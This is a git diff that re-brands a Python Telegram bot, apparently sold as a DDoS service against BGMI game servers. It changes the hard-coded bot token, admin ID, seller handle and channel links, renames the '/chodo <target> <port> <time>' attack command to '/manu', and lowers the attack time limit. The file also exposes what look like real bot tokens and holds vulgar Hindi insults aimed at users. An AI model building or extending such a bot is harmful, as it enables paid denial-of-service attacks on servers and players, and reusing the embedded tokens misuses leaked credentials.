@@ -5,10 +5,10 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7690473164:AAFYQmT8lfLo6OdJToIwwAk_t6wIq_BxdbQ')
+bot = telebot.TeleBot('7919319817:AAFAZOkc3BCptK3DtgGQo_awFG8pIbfj5pA')
 
 # Admin user IDs
-admin_id = {"7083378335"}
+admin_id = {"1436507974"}
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -148,7 +148,7 @@ def add_user(message):
         else:
             response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add ."
     else:
-        response = "Mood ni hai abhi pelhe purchase kar isse:- @TREXVIVEK."
+        response = "Mood ni hai abhi pelhe purchase kar isse:- @MANUHACKSOWNER."
 
     bot.reply_to(message , response)
 
@@ -184,7 +184,7 @@ def remove_user(message):
             response = '''Please Specify A User ID to Remove. 
  Usage: /remove <userid>'''
     else:
-        response = "Purchase karle bsdk:- @TREXVIVEK ."
+        response = "Purchase karle bsdk:- @MANUHACKSOWNER ."
 
     bot.reply_to(message, response)
     
@@ -291,12 +291,12 @@ def handle_attack(message):
             port = int(command[2])  # Convert port to integer
             time = int(command[3])  # Convert time to integer
 
-            if time > 300:
-                response = "Error: Time interval must be less than 300"
+            if time > 240:
+                response = "Error: Time interval must be less than 240"
             else:
                 attack_running = True  # Set the attack state to running
                 try:
-                    record_command_logs(user_id, '/chodo', target, port, time)
+                    record_command_logs(user_id, '/manu', target, port, time)
                     log_command(user_id, target, port, time)
                     start_attack_reply(message, target, port, time)
 
@@ -310,7 +310,7 @@ def handle_attack(message):
                 finally:
                     attack_running = False  # Reset the attack state
         else:
-            response = "Usage: /chodo <target> <port> <time>"
+            response = "Usage: /manu <target> <port> <time>"
     else:
         response = "ACCESS TOH LELE LAURE FREE mai kuch nahi milega FREE mai shrif mere LUND milega lega toh bata ."
 
@@ -343,7 +343,7 @@ def show_command_logs(message):
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text ='''
-💥 /chodo : 😫BGMI WALO KI MAA KO CHODO🥵. 
+💥 /manu : 😫BGMI WALO KI MAA KO CHODO🥵. 
 💥 /rules : 📒GWAR RULES PADHLE KAM AYEGA📒 !!.
 💥 /mylogs : 👁️SAB CHUDAI DEKHO👁️.
 💥 /plan : 💵SABKE BSS KA BAT HAI💵.
@@ -352,8 +352,8 @@ def show_help(message):
 👀 To See Admin Commands:
 🤖 /admincmd : Shows All Admin Commands.
 
-Buy From :- @TREXVIVEK
-Official Channel :- https://t.me/+HEyXXgA_1hU4NmZl
+Buy From :- @MANUHACKSOWNER
+Official Channel :- https://t.me/+MrbmWtUWyMlhZTJl
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -370,7 +370,7 @@ def welcome_start(message):
     user_name = message.from_user.first_name
     response = f'''VIVEK ke LODE pe aapka swagat hai, {user_name}! Sabse acche se bgmi ki maa behen yahi hack karta hai. Kharidne ke liye Kira se sampark karein.
 🤗Try To Run This Command : /help 
-💵BUY :- @TREXVIVEK'''
+💵BUY :- @MANUHACKSOWNER'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rules'])
@@ -380,7 +380,7 @@ def welcome_rules(message):
 
 1. Dont Run Too Many Attacks !! Cause A Ban From Bot
 2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
-3. MAKE SURE YOU JOINED https://t.me/+HEyXXgA_1hU4NmZl OTHERWISE NOT WORK
+3. MAKE SURE YOU JOINED https://t.me/+MrbmWtUWyMlhZTJl OTHERWISE NOT WORK
 4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
     bot.reply_to(message, response)
 
